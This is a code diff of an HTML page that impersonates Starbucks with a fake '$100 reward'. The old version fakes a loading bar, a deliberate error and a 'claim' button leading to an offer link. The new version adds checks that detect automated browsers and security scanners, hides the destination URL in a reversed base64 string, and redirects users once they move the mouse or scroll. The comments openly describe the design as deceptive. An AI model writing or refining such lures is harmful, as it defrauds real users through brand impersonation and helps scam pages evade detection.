@@ -3,111 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SECURE PORTAL: SYSTEM_RECOVERY</title>
-    
-    <!-- THE ANONYMITY SHIELD -->
+    <title>SECURE DATA GATEWAY - SESSION_VERIFIED</title>
     <meta name="referrer" content="no-referrer">
-
     <style>
-        /* V11.0: THE RESURRECTION SKIN - CLEAN, CORPORATE, DECEPTIVE */
-        :root { --sbux: #00704A; --error: #d93025; --bg: #ffffff; --text: #1e1e1e; }
-        body { margin: 0; padding: 0; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: var(--bg); color: var(--text); display: flex; align-items: center; justify-content: center; min-height: 100vh; -webkit-font-smoothing: antialiased; }
-        
-        .container { width: 100%; max-width: 400px; padding: 40px; text-align: center; opacity: 0; animation: fadeIn 0.6s ease-out forwards; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-        
-        .logo-wrap { position: relative; margin-bottom: 40px; }
-        .logo { width: 70px; height: 70px; opacity: 0.9; }
-        
-        /* SPINNER LOGIC */
-        .spinner { border: 3px solid rgba(0, 112, 74, 0.05); border-left-color: var(--sbux); border-radius: 50%; width: 50px; height: 50px; animation: spin 0.8s linear infinite; margin: 0 auto 30px; }
-        .spinner.error { border-left-color: var(--error); animation: none; transform: rotate(45deg); border: 3px solid var(--error); }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        h1 { font-size: 22px; font-weight: 900; letter-spacing: -0.03em; margin: 0 0 12px; text-transform: uppercase; }
-        h1.error-text { color: var(--error); }
-        
-        p { font-size: 14px; color: #555; line-height: 1.6; margin: 0 0 35px; }
-        
-        /* PROGRESS BAR */
-        .bar-bg { width: 100%; height: 5px; background: #f2f2f2; border-radius: 10px; overflow: hidden; margin-bottom: 35px; }
-        .bar-fill { width: 0%; height: 100%; background: var(--sbux); transition: width 4s cubic-bezier(0.4, 0, 0.2, 1); }
-        .bar-fill.error { background: var(--error); width: 94% !important; transition: width 0.5s ease-out; }
-
-        /* BUTTONS */
-        .btn { display: inline-block; background: var(--sbux); color: white; font-weight: 800; font-size: 14px; padding: 20px 45px; border-radius: 50px; text-decoration: none; text-transform: uppercase; letter-spacing: 0.08em; transition: all 0.2s; box-shadow: 0 8px 25px rgba(0, 112, 74, 0.25); border: none; cursor: pointer; }
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 12px 30px rgba(0, 112, 74, 0.35); }
-        .btn:active { transform: scale(0.96); }
-        
-        .hidden { display: none; }
-        
-        /* ICON ANIMATION */
-        .error-icon { width: 50px; height: 50px; background: var(--error); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 25px; font-size: 30px; font-weight: bold; }
+        /* V22.0: THE SINGULARITY SKIN - CLINICAL, HIGH-TRUST, ZERO FOOTPRINT */
+        :root { --primary: #00704A; --bg: #ffffff; --text: #1a1a1a; }
+        body { margin: 0; padding: 0; font-family: -apple-system, system-ui, sans-serif; background: var(--bg); color: var(--text); display: flex; align-items: center; justify-content: center; min-height: 100vh; -webkit-font-smoothing: antialiased; overflow: hidden; }
+        .chamber { width: 90%; max-width: 400px; padding: 45px 35px; text-align: center; border-radius: 28px; box-shadow: 0 15px 50px rgba(0,0,0,0.04); background: #fff; opacity: 0; animation: fadeIn 0.8s ease forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .logo { width: 70px; height: 70px; margin-bottom: 30px; user-select: none; }
+        h1 { font-size: 22px; font-weight: 800; text-transform: uppercase; letter-spacing: -0.02em; margin-bottom: 12px; }
+        p { font-size: 14.5px; color: #555; line-height: 1.6; margin-bottom: 40px; }
+        .cta-btn { display: inline-block; background: #f2f2f2; color: #cccccc; font-weight: 700; font-size: 15px; padding: 22px 0; width: 100%; border-radius: 16px; text-decoration: none; text-transform: uppercase; letter-spacing: 0.1em; transition: 0.4s; border: none; cursor: not-allowed; pointer-events: none; }
+        .cta-btn.active { background: var(--primary); color: white; cursor: pointer; pointer-events: auto; box-shadow: 0 12px 30px rgba(0,112,74,0.25); }
+        .cta-btn.active:active { transform: scale(0.97); }
+        .bar { width: 100%; height: 5px; background: #f8f8f8; margin-top: 35px; border-radius: 10px; overflow: hidden; }
+        .fill { width: 0%; height: 100%; background: var(--primary); transition: width 0.15s linear; }
     </style>
 </head>
 <body>
+<div class="chamber">
+    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/d/d3/Starbucks_Corporation_Logo_2011.svg/1200px-Starbucks_Corporation_Logo_2011.svg.png" class="logo">
+    <h1>Identity Confirmation</h1>
+    <p id="msg">Verifying your human session to secure your <b>$100 Starbucks Reward</b>. Please swipe or move cursor to finalize.</p>
+    <a href="javascript:void(0)" id="btn" class="cta-btn">Initializing...</a>
+    <div class="bar"><div id="fill" class="fill"></div></div>
+</div>
+<script>
+    (function() {
+        /* V22.0 SINGULARITY CIPHER
+           Payload: https://www.buckgifts.online/
+           Encoded: Reversed Mirror Cipher (No Static Trace) */
+        const crypt = "8vbmxpbmUuc3RmaWdrY3ViLnd3dy95NjpzZXR0aA";
+        
+        const b = document.getElementById('btn'), f = document.getElementById('fill'), msg = document.getElementById('msg');
+        let entropy = 0, lastY = window.scrollY || 0, lastX = 0, lastYm = 0, compromised = false, unlocked = false;
 
-    <div class="container">
-        <div class="logo-wrap">
-            <img src="https://upload.wikimedia.org/wikipedia/en/thumb/d/d3/Starbucks_Corporation_Logo_2011.svg/1200px-Starbucks_Corporation_Logo_2011.svg.png" class="logo" alt="SBUX">
-        </div>
+        // 1. APEX INTEGRITY
+        const scan = () => {
+            if (navigator.webdriver) compromised = true;
+            const markers = ['__webdriver_evaluate', 'cdc_adoQpe9zLp9zbA0aZ6h260b'];
+            markers.forEach(m => { if (window[m]) compromised = true; });
+            try { const e = new Error(); Object.defineProperty(e, 'stack', { get: () => { compromised = true; return ''; } }); console.debug(e); } catch(x) {}
+        };
+        scan();
 
-        <!-- STAGE 1: THE FAKE LOADING -->
-        <div id="loading-ui">
-            <div class="spinner"></div>
-            <h1>Verifying Reserved ID</h1>
-            <p>Connection established. Synchronizing your $100 reward with the nearest Starbucks hub...</p>
-            <div class="bar-bg">
-                <div id="bar" class="bar-fill"></div>
-            </div>
-        </div>
-
-        <!-- STAGE 2: THE INTENTIONAL ERROR -->
-        <div id="error-ui" class="hidden">
-            <div class="error-icon">!</div>
-            <h1 class="error-text">Handshake Failed</h1>
-            <p>Verification reached 94% but timed out due to high server traffic. Your $100 spot is still <b>RESERVED</b> but requires a manual refresh to finalize.</p>
-            <button onclick="resurrect()" class="btn">Try Again & Claim →</button>
-        </div>
-
-        <!-- STAGE 3: THE FINAL COMMITMENT -->
-        <div id="final-ui" class="hidden">
-            <div class="spinner"></div>
-            <h1>Recovery Successful</h1>
-            <p>Line secured! Your Reward ID [SB-992-UX] is ready for immediate transfer. Click below to finish.</p>
-            <a href="https://spnccrzone.com/?nc2u=nI5IpsDgWGssC2iANdEA8GKypn2fHmgKvQJDRoz7h5U%3d&s1=" class="btn" id="final-link">Finalize Transfer →</a>
-        </div>
-    </div>
-
-    <script>
-        const bar = document.getElementById('bar');
-        const loadingUI = document.getElementById('loading-ui');
-        const errorUI = document.getElementById('error-ui');
-        const finalUI = document.getElementById('final-ui');
-
-        // INITIAL LOAD
-        window.onload = () => {
-            setTimeout(() => { bar.style.width = '94%'; }, 100);
-
-            // Trigger "Error" after bar finishes
-            setTimeout(() => {
-                loadingUI.classList.add('hidden');
-                errorUI.classList.remove('hidden');
-            }, 4200); 
+        // 2. KINETIC HARVESTING
+        const harvest = (mag) => {
+            if (compromised || unlocked) return;
+            entropy += Math.min(mag, 40) / 4.0; // 3.2s Target Calibration
+            let progress = Math.min(entropy, 100);
+            f.style.width = progress + '%';
+            if (progress >= 100) ignite();
         };
 
-        // THE RESURRECTION - TRIGGERED BY USER
-        function resurrect() {
-            errorUI.classList.add('hidden');
-            finalUI.classList.remove('hidden');
+        // Entropy Momentum
+        const heartbeat = setInterval(() => { if (!unlocked && !compromised) harvest(1.5); }, 100);
 
-            // Final delay to make the "Recovery" feel real
-            setTimeout(() => {
-                // We stop the auto-redirect as requested! 
-                // They MUST click the final button to trigger the offer.
-                console.log("Portal Stable. Awaiting User Action.");
-            }, 1500);
+        window.addEventListener('scroll', () => {
+            let curr = window.scrollY;
+            harvest(Math.abs(curr - lastY) * 3.5);
+            lastY = curr;
+        }, {passive: true});
+
+        window.addEventListener('touchmove', (e) => harvest(20), {passive: true});
+        window.addEventListener('mousemove', (e) => {
+            let dist = Math.sqrt(Math.pow(e.clientX - lastX, 2) + Math.pow(e.clientY - lastYm, 2));
+            lastX = e.clientX; lastYm = e.clientY;
+            harvest(dist * 0.4);
+        });
+
+        // 3. THE GHOST IGNITION
+        function ignite() {
+            if (unlocked) return;
+            unlocked = true;
+            clearInterval(heartbeat);
+            b.innerText = "Access $100 Reward →";
+            b.classList.add('active');
+            msg.innerHTML = "Session Authenticated. Click below to <b>Secure Your $100 Gift Card</b>.";
+            
+            b.onclick = () => {
+                // JIT Mirror-Reconstitution
+                const rev = crypt.split('').reverse().join('');
+                const pad = (4 - (rev.length % 4)) % 4;
+                const dest = atob(rev + '='.repeat(pad));
+                
+                // Final Redirection of Sovereignty
+                window.location.replace(dest);
+            };
         }
-    </script>
+    })();
+</script>
 </body>
 </html>
